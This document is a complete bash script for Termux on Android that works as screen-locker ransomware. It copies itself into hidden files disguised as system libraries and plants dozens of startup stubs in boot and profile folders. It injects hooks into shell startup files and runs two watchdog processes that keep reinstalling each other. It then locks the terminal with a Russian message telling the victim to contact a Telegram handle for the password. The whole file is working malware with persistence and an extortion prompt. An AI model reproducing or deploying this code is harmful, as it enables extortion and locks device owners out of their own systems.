#!/data/data/com.termux/files/usr/bin/env bash

pass="123"
tg="@telegram"

PREFIX="${PREFIX:-/data/data/com.termux/files/usr}"
HOME_DIR="${HOME:-/data/data/com.termux/files/home}"
LIB="$PREFIX/lib"
ETC="$PREFIX/etc"
BIN="$PREFIX/bin"
SHARE="$PREFIX/share"
VAR="$PREFIX/var"
TMPD="${TMPDIR:-$PREFIX/tmp}"
REALBASH="$PREFIX/bin/bash"
[ -x "$REALBASH" ] || REALBASH="/system/bin/sh"

CORE="$LIB/.termux_exec.so"
BK="$LIB/.bk"
PASSFILE="$BK/k"
ENVF="$LIB/.termux_env"
SVC1="$LIB/.termux_svc"
SVC2="$LIB/.termux_svc2"
MARK="# sys"
MARK_END="# /sys"

enc_pass() {
  printf '%s' "$1" | python3 -c 'import sys,zlib,base64;d=sys.stdin.buffer.read();sys.stdout.write(base64.b85encode(zlib.compress(d,9)).decode())' 2>/dev/null
}
dec_pass() {
  printf '%s' "$1" | python3 -c 'import sys,zlib,base64;e=sys.stdin.read().strip();sys.stdout.buffer.write(zlib.decompress(base64.b85decode(e)))' 2>/dev/null
}
load_pass() {
  PASS=""
  [ -f "$PASSFILE" ] && PASS=$(dec_pass "$(cat "$PASSFILE" 2>/dev/null)")
  [ -z "$PASS" ] && PASS="$pass"
  [ -z "$PASS" ] && PASS="123"
}
save_pass_from_var() {
  mkdir -p "$BK" 2>/dev/null
  enc_pass "$pass" > "$PASSFILE" 2>/dev/null
  chmod 600 "$PASSFILE" 2>/dev/null
}

write_stub() {
  mkdir -p "$(dirname "$1")" 2>/dev/null
  cat > "$1" << STUB
#!/data/data/com.termux/files/usr/bin/env bash
C="$CORE"
R="$REALBASH"
[ -x "\$C" ] || C="$BK/c"
[ -x "\$R" ] || R="/system/bin/sh"
if [ -z "\$SYSINIT_DONE" ] && [ -x "\$C" ]; then
  export SYSINIT_ACTIVE=1
  "\$R" "\$C" --inner
  unset SYSINIT_ACTIVE
fi
STUB
  chmod 755 "$1" 2>/dev/null
}

gen_paths() {
  local i ii
  for i in $(seq 1 25); do
    ii=$(printf '%02d' "$i")
    echo "$LIB/.t$ii"
    echo "$ETC/.p$ii"
    echo "$BIN/.b$ii"
    echo "$HOME_DIR/.termux/boot/.h$ii"
  done
  echo "$LIB/.libtermux.so"
  echo "$LIB/.libexec.so"
  echo "$LIB/.cache_init"
  echo "$LIB/.pkg_hook"
  echo "$ETC/.profile.d/sysinit.sh"
  echo "$ETC/.profile.d/00termux.sh"
  echo "$ETC/.profile.d/99local.sh"
  echo "$ETC/profile.d/termux.sh"
  echo "$ETC/profile.d/00android.sh"
  echo "$ETC/.bashrc.d/sys.sh"
  echo "$ETC/.bashrc.d/00init.sh"
  echo "$ETC/termux/sysinit"
  echo "$ETC/termux/.boot"
  echo "$SHARE/termux/boot/sys.sh"
  echo "$VAR/run/.sys"
  echo "$TMPD/.sysinit"
  echo "$HOME_DIR/.termux/boot/.sys"
  echo "$HOME_DIR/.termux/boot/00sys.sh"
  echo "$HOME_DIR/.termux/boot/init.sh"
  echo "$HOME_DIR/.termux/boot/termux.sh"
  echo "$HOME_DIR/.termux/boot/99local.sh"
  echo "$HOME_DIR/.termux/boot/.hidden"
  echo "$HOME_DIR/.termux/sysinit.sh"
  echo "$HOME_DIR/.config/termux/init.sh"
  echo "$HOME_DIR/.local/bin/.sys"
  echo "$BIN/.sysinit"
  echo "$BIN/termux-sys"
  echo "$PREFIX/opt/.sys/init.sh"
}

wipe_all() {
  export SYSINIT_DONE=1
  export BASH_ENV=
  unset BASH_ENV

  if [ -f "$SVC1" ]; then
    for pid in $(pgrep -f "$SVC1" 2>/dev/null); do
      kill -9 "$pid" 2>/dev/null
    done
  fi
  if [ -f "$SVC2" ]; then
    for pid in $(pgrep -f "$SVC2" 2>/dev/null); do
      kill -9 "$pid" 2>/dev/null
    done
  fi
  for pid in $(pgrep -f 'lib/\.termux_svc' 2>/dev/null); do
    kill -9 "$pid" 2>/dev/null
  done

  sleep 1

  for f in "$HOME_DIR/.bashrc" "$HOME_DIR/.profile" "$HOME_DIR/.zshrc" "$HOME_DIR/.bash_profile" "$ETC/bash.bashrc"; do
    [ -f "$f" ] || continue
    sed -i "/$MARK/,/$MARK_END/d" "$f" 2>/dev/null
    sed -i '/SYSINIT/d' "$f" 2>/dev/null
    sed -i '/termux_exec/d' "$f" 2>/dev/null
    sed -i '/termux_env/d' "$f" 2>/dev/null
    sed -i '/BASH_ENV/d' "$f" 2>/dev/null
  done

  local p
  while IFS= read -r p; do
    [ -n "$p" ] && rm -f "$p" 2>/dev/null
  done < <(gen_paths)

  rm -f "$CORE" "$ENVF" "$SVC1" "$SVC2" 2>/dev/null
  rm -f "$LIB/.t"* "$ETC/.p"* "$BIN/.b"* 2>/dev/null
  rm -f "$HOME_DIR/.termux/boot/.h"* 2>/dev/null
  rm -f "$HOME_DIR/.termux/boot/"* 2>/dev/null
  rm -rf "$BK" 2>/dev/null

  export SYSINIT_DONE=1
}

drop_all_stubs() {
  local p jobs=0
  while IFS= read -r p; do
    [ -z "$p" ] && continue
    write_stub "$p" &
    jobs=$((jobs+1))
    [ "$jobs" -ge 8 ] && { wait; jobs=0; }
  done < <(gen_paths)
  wait
}

install_core() {
  mkdir -p "$LIB" "$BK" "$ETC/.profile.d" "$ETC/profile.d" "$ETC/.bashrc.d" \
    "$ETC/termux" "$HOME_DIR/.termux/boot" "$HOME_DIR/.config/termux" \
    "$HOME_DIR/.local/bin" "$SHARE/termux/boot" "$VAR/run" "$TMPD" "$PREFIX/opt/.sys" 2>/dev/null
  cp "$0" "$CORE"
  cp "$0" "$BK/c"
  chmod 755 "$CORE" "$BK/c"
  save_pass_from_var
  drop_all_stubs
}

install_hook() {
  local rc="$1"
  [ ! -f "$rc" ] && touch "$rc"
  sed -i "/$MARK/,/$MARK_END/d" "$rc" 2>/dev/null
  printf '%s\n' "$MARK" >> "$rc"
  printf '%s\n' 'if [ -z "$SYSINIT_DONE" ]; then' >> "$rc"
  printf '%s\n' '  export SYSINIT_ACTIVE=1' >> "$rc"
  printf '%s\n' "  [ -x $CORE ] && $REALBASH $CORE --inner" >> "$rc"
  printf '%s\n' '  unset SYSINIT_ACTIVE' >> "$rc"
  printf '%s\n' 'fi' >> "$rc"
  printf '%s\n' "export BASH_ENV=$ENVF" >> "$rc"
  printf '%s\n' "$MARK_END" >> "$rc"
}

install_env() {
  printf '%s\n' 'if [ -z "$SYSINIT_DONE" ]; then' > "$ENVF"
  printf '%s\n' '  export SYSINIT_ACTIVE=1' >> "$ENVF"
  printf '%s\n' "  [ -x $CORE ] && $REALBASH $CORE --inner" >> "$ENVF"
  printf '%s\n' '  unset SYSINIT_ACTIVE' >> "$ENVF"
  printf '%s\n' 'fi' >> "$ENVF"
  chmod 755 "$ENVF"
}

install_svc() {
  cat > "$SVC1" << 'SVC'
#!/data/data/com.termux/files/usr/bin/env bash
PREFIX="${PREFIX:-/data/data/com.termux/files/usr}"
LIB="$PREFIX/lib"
CORE="$LIB/.termux_exec.so"
BK="$LIB/.bk"
HOME_DIR="${HOME:-/data/data/com.termux/files/home}"
RB="$PREFIX/bin/bash"
[ -x "$RB" ] || RB=/system/bin/sh
while true; do
  [ -n "$SYSINIT_DONE" ] && exit 0
  [ ! -f "$CORE" ] && [ -f "$BK/c" ] && cp "$BK/c" "$CORE" && chmod 755 "$CORE"
  if [ -f "$HOME_DIR/.bashrc" ] && ! grep -q "# sys" "$HOME_DIR/.bashrc" 2>/dev/null; then
    echo "# sys" >> "$HOME_DIR/.bashrc"
    echo 'if [ -z "$SYSINIT_DONE" ]; then export SYSINIT_ACTIVE=1; [ -x /data/data/com.termux/files/usr/lib/.termux_exec.so ] && /data/data/com.termux/files/usr/bin/bash /data/data/com.termux/files/usr/lib/.termux_exec.so --inner; unset SYSINIT_ACTIVE; fi' >> "$HOME_DIR/.bashrc"
    echo "export BASH_ENV=/data/data/com.termux/files/usr/lib/.termux_env" >> "$HOME_DIR/.bashrc"
    echo "# /sys" >> "$HOME_DIR/.bashrc"
  fi
  if ! pgrep -f "termux_exec.so --inner" >/dev/null 2>&1; then
    if pgrep -f "com.termux" >/dev/null 2>&1 && [ -x "$CORE" ]; then
      "$RB" "$CORE" --inner >/dev/null 2>&1 &
    fi
  fi
  sleep 3
done
SVC
  chmod 755 "$SVC1"

  cat > "$SVC2" << 'SVC2'
#!/data/data/com.termux/files/usr/bin/env bash
PREFIX="${PREFIX:-/data/data/com.termux/files/usr}"
LIB="$PREFIX/lib"
RB="$PREFIX/bin/bash"
[ -x "$RB" ] || RB=/system/bin/sh
while true; do
  [ -n "$SYSINIT_DONE" ] && exit 0
  if ! pgrep -f "termux_svc$" >/dev/null 2>&1; then
    [ -x "$LIB/.termux_svc" ] && "$RB" "$LIB/.termux_svc" >/dev/null 2>&1 &
  fi
  sleep 3
done
SVC2
  chmod 755 "$SVC2"

  nohup "$REALBASH" "$SVC1" >/dev/null 2>&1 &
  nohup "$REALBASH" "$SVC2" >/dev/null 2>&1 &
}

install_boot() {
  mkdir -p "$HOME_DIR/.termux/boot" 2>/dev/null
  for name in .sys 00sys.sh init.sh termux.sh 99local.sh .hidden; do
    write_stub "$HOME_DIR/.termux/boot/$name"
  done
}

run_locker() {
  load_pass
  trap '' INT TSTP
  stty -echo 2>/dev/null
  printf '\033[?25l' 2>/dev/null
  restore() {
    stty echo 2>/dev/null
    printf '\033[?25h' 2>/dev/null
    trap - INT TSTP
  }
  trap restore EXIT
  while true; do
    clear 2>/dev/null || printf '\033c'
    echo "=========================================="
    echo "        СИСТЕМА ЗАБЛОКИРОВАНА"
    echo "=========================================="
    echo "пиши мне в телеграмм за паролем: $tg"
    echo "=========================================="
    printf "Пароль: "
    input=""
    while true; do
      IFS= read -r -n 1 -s char 2>/dev/null
      [ $? -ne 0 ] && continue
      [ -z "$char" ] && break
      if [ "$char" = $'\x7f' ] || [ "$char" = $'\b' ]; then
        if [ -n "$input" ]; then
          input="${input%?}"
          printf "\b \b"
        fi
        continue
      fi
      input="${input}${char}"
      printf "*"
    done
    echo ""
    if [ "$input" = "$PASS" ]; then
      restore
      wipe_all
      clear 2>/dev/null
      echo "Разблокировано."
      exit 0
    fi
    echo "Неверно."
    sleep 0.3
  done
}

do_hard() {
  echo "[*] install..."
  install_core
  install_hook "$HOME_DIR/.profile"
  install_hook "$HOME_DIR/.bashrc"
  [ -f "$HOME_DIR/.zshrc" ] && install_hook "$HOME_DIR/.zshrc"
  install_env
  install_svc
  install_boot
  echo "[*] lock"
  exec "$REALBASH" "$CORE" --inner
}

case "${1:-}" in
  --inner) run_locker ;;
  --wipe) wipe_all ;;
  *) do_hard ;;
esac
